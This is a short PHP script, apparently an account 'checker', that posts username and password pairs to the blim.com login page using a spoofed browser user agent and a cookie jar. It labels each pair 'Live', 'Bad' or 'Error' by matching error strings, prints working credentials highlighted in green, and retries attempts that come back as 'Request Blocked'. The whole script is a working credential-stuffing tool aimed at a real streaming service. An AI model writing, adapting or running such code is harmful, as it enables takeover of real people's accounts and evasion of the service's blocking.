<?php
    $url = "https://www.blim.com/cuenta/ingresar";

    do{
        
        if(isset($_POST['username']) and isset($_POST['password'])){
            $username = $_POST['username'];
            $password = $_POST['password'];
            $remember = 1;

            $cookies = "a.txt";

            $post = "username=".$username."&password=".$password."&remember=".$remember;

            $ch =   curl_init();
                    curl_setopt($ch, CURLOPT_URL, $url);
                    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36");
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
                    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
            $resultado = curl_exec($ch);

            if(strpos($resultado, "incorrectos") or strpos($resultado, "no es un correo") or strpos($resultado, "Value is required") or strpos($resultado, "an not be matched")){
                $status = "Bad";
                echo "<tr style='background: #ff2d2d;'>";
            }else if(strpos($resultado, "is not a valid") or strpos($resultado, "Request Blocked")){
                $status = "Error";
                echo "<tr style='display: none; background: #ff2d2d; color: white;'>";
            }else{
                $status = "Live";
                echo "<tr style='background: #86ff86;'>";
                echo $resultado;
            }

            echo "<td>".$username."</td>";
            echo "<td>".$password."</td>";
            echo "<td>".$status."</td>";
        echo "</tr>";
        }

    }while($status == "Error");